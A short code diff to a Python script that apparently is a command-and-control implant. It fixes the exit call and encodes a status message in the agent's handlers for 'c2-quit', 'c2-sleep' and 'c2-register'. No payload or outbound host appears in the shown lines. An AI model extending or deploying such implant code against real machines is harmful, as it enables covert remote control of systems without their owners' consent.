@@ -7,6 +7,7 @@ import struct
 from time import sleep
 import os
 import platform
+import sys
 
 is_base64_enabled = True
 
@@ -217,12 +218,12 @@ while True:
 
             if cmd[0] == "c2-quit": 
                 print("c2-quit... exiting...")               
-                exit(1)
+                sys.exit(1)
 
             elif cmd[0] == "c2-sleep": 
                 delay = int(cmd[1])
                 print(f"c2-sleep set to {delay}")  
-                post_results(f"sleep set to {delay}")                             
+                post_results(f"sleep set to {delay}".encode("utf-8"))                             
                 
             elif cmd[0] == "c2-register":
                 name = register()                
